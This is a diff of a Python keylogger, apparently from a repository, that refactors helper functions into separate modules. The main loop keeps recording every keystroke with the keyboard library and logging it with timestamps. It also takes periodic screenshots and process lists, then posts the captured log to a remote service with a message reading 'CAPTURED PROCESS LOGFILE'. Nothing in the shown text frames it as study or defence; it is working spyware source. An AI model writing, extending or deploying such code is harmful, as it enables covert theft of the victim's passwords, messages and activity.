@@ -2,48 +2,58 @@ import keyboard
 import requests
 import datetime
 import time
-import pyscreenshot as ImageGrab
-import subprocess
+# import pyscreenshot as ImageGrab
+# import subprocess
+import file_handler
+import process_handler
+
+#
+# def processlist_sort():
+#     file = open("Process_list.txt", "r")
+#     sortedlist = file.read()
+#     sortedlist.replace("\r\r\n'b'", "\t")
+#
+# def parse_process_list():
+#     cmd = 'tasklist /v'
+#     proc = subprocess.getoutput(cmd).split("\n")
+#     file = open("Process_list.txt", "w+")
+#     file.write(str(proc))
+#     file.close()
 
 
-def processlist_sort():
-    file = open("Process_list.txt", "r")
-    sortedlist = file.read()
-    sortedlist.replace("\r\r\n'b'", "\t")
-
-def screenShot():
-    # fullscreen
-    im=ImageGrab.grab()
-    im.save("file.png")
-
-def file_flush():
-    f = open("LOG.txt", 'w')
-    f.write("\n")
-    f.close()
-
-def file_input(recorded):
-    now_time = datetime.datetime.now()
-    w = open("LOG.txt", 'a')
-
-    w.write("\n")
-    w.write(str(recorded))
-    w.write("\n")
-    w.write("\n")
-    w.write("--------------------------------------\n")
-    w.write("\n")
-    w.write(str(now_time))
-    w.write("\n")
-    w.write("--------------------------------------\n")
-    w .close()
-
-def file_write(typedstr):
-    w = open("LOG.txt", 'a')
-    w.write("\n")
-    w.write(typedstr)
-    w.write("\n")
-    w.write("\n")
-    w.write("--------------------------------------\n")
-    w.close()
+# def screenShot():
+#     # fullscreen
+#     im=ImageGrab.grab()
+#     im.save("file.png")
+#
+# def file_flush():
+#     f = open("LOG.txt", 'w')
+#     f.write("\n")
+#     f.close()
+#
+# def file_input(recorded):
+#     now_time = datetime.datetime.now()
+#     w = open("LOG.txt", 'a')
+#
+#     w.write("\n")
+#     w.write(str(recorded))
+#     w.write("\n")
+#     w.write("\n")
+#     w.write("--------------------------------------\n")
+#     w.write("\n")
+#     w.write(str(now_time))
+#     w.write("\n")
+#     w.write("--------------------------------------\n")
+#     w .close()
+#
+# def file_write(typedstr):
+#     w = open("LOG.txt", 'a')
+#     w.write("\n")
+#     w.write(typedstr)
+#     w.write("\n")
+#     w.write("\n")
+#     w.write("--------------------------------------\n")
+#     w.close()
 
 def send_simple_message(file_content):
     return requests.post(
@@ -66,22 +76,15 @@ def send_LOG():
               "text": "CAPTURED PROCESS LOGFILE you should view on google docs"
               })
 
-def parse_process_list():
-    cmd = 'tasklist /v'
-    proc = subprocess.getoutput(cmd).split("\n")
-    file = open("Process_list.txt", "w+")
-    file.write(str(proc))
-    file.close()
-
-
 if __name__ == "__main__":
+
      print('start')
      while 1:
          status = time.localtime()
          recorded = keyboard.record(until='enter')
          typedstr = " ".join(keyboard.get_typed_strings(recorded))
-         file_input(recorded)
-         file_write(typedstr)
+         file_handler.file_input(recorded)
+         file_handler.file_write(typedstr)
 
          f = open("LOG.txt", 'r')
          file_content = f.read()
@@ -95,9 +98,9 @@ if __name__ == "__main__":
              print ('count:', count)
 
          if (now.strftime('%M') == '5'):
-            screenShot()
-            parse_process_list()
+            file_handler.screenShot()
+            process_handler.parse_process_list()
             send_simple_message(file_content)
             send_LOG()
             print("done")
-            file_flush()
+            file_handler.file_flush()
